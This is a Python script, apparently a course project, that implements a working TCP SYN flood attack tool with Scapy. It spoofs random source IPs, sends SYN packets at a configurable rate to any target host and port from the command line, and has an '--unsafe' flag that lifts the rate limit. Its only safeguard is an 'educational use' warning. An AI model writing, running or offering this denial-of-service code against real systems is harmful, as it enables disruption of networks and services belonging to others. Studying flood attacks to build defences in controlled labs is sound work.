#!/usr/bin/env python3
"""
SecureNet DC - SYN Flood Attack Simulator
CPEG 460 Bonus Project

Simulates TCP SYN flood attack for educational purposes.
This attack exploits the TCP three-way handshake by sending
many SYN packets without completing the handshake.

WARNING: For educational use only in controlled environments.
"""

from scapy.all import IP, TCP, send, RandShort
import time
import random
import logging

logger = logging.getLogger(__name__)


class SYNFlood:
    """
    SYN Flood Attack Simulator.

    Sends TCP SYN packets to exhaust server resources by creating
    many half-open connections.
    """

    def __init__(self, target_ip, target_port=80, safe_mode=True):
        """
        Initialize SYN Flood attack.

        Args:
            target_ip: Target IP address
            target_port: Target port (default: 80)
            safe_mode: Limit attack intensity (default: True)
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.safe_mode = safe_mode
        self.running = False
        self.packets_sent = 0
        self.max_pps = 100 if safe_mode else 1000

        logger.info(f"SYN Flood initialized: target={target_ip}:{target_port}")

    def craft_packet(self, src_ip=None, src_port=None):
        """
        Craft a SYN packet.

        Args:
            src_ip: Source IP (random if None)
            src_port: Source port (random if None)

        Returns:
            Scapy packet object
        """
        # Random source IP if not specified (spoofing)
        if src_ip is None:
            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}." \
                     f"{random.randint(1,254)}.{random.randint(1,254)}"

        # Random source port if not specified
        if src_port is None:
            src_port = random.randint(1024, 65535)

        # Craft IP layer
        ip_layer = IP(
            src=src_ip,
            dst=self.target_ip
        )

        # Craft TCP layer with SYN flag
        tcp_layer = TCP(
            sport=src_port,
            dport=self.target_port,
            flags='S',  # SYN flag
            seq=random.randint(0, 2**32-1),
            window=random.randint(1000, 65535)
        )

        return ip_layer / tcp_layer

    def start(self, duration=30, pps=None, callback=None):
        """
        Start the SYN flood attack.

        Args:
            duration: Attack duration in seconds
            pps: Packets per second (limited in safe mode)
            callback: Function to call with progress updates

        Returns:
            dict: Attack statistics
        """
        if pps is None:
            pps = self.max_pps
        elif self.safe_mode and pps > self.max_pps:
            pps = self.max_pps
            logger.warning(f"Safe mode: PPS limited to {self.max_pps}")

        self.running = True
        self.packets_sent = 0
        start_time = time.time()
        interval = 1.0 / pps

        logger.warning(f"[!] Starting SYN Flood against {self.target_ip}:{self.target_port}")
        logger.warning(f"[!] Duration: {duration}s, PPS: {pps}")

        try:
            while self.running and (time.time() - start_time) < duration:
                # Craft and send packet
                pkt = self.craft_packet()
                send(pkt, verbose=0)
                self.packets_sent += 1

                # Progress callback
                if callback and self.packets_sent % 100 == 0:
                    elapsed = time.time() - start_time
                    callback({
                        'packets_sent': self.packets_sent,
                        'elapsed': elapsed,
                        'rate': self.packets_sent / elapsed if elapsed > 0 else 0
                    })

                # Rate limiting
                time.sleep(interval)

        except KeyboardInterrupt:
            logger.info("Attack interrupted by user")
        finally:
            self.running = False

        elapsed = time.time() - start_time
        stats = {
            'attack_type': 'SYN_FLOOD',
            'target': f"{self.target_ip}:{self.target_port}",
            'duration': elapsed,
            'packets_sent': self.packets_sent,
            'average_pps': self.packets_sent / elapsed if elapsed > 0 else 0
        }

        logger.info(f"[+] Attack complete: {self.packets_sent} packets in {elapsed:.1f}s")
        return stats

    def stop(self):
        """Stop the attack."""
        self.running = False
        logger.info("SYN Flood stopped")


def main():
    """Command-line interface for SYN flood."""
    import argparse

    parser = argparse.ArgumentParser(
        description='SYN Flood Attack Simulator (Educational)'
    )
    parser.add_argument('target', help='Target IP address')
    parser.add_argument('-p', '--port', type=int, default=80,
                       help='Target port (default: 80)')
    parser.add_argument('-d', '--duration', type=int, default=30,
                       help='Duration in seconds (default: 30)')
    parser.add_argument('-r', '--rate', type=int, default=100,
                       help='Packets per second (default: 100)')
    parser.add_argument('--unsafe', action='store_true',
                       help='Disable safe mode (higher rates)')

    args = parser.parse_args()

    attack = SYNFlood(args.target, args.port, safe_mode=not args.unsafe)
    attack.start(duration=args.duration, pps=args.rate)


if __name__ == '__main__':
    main()
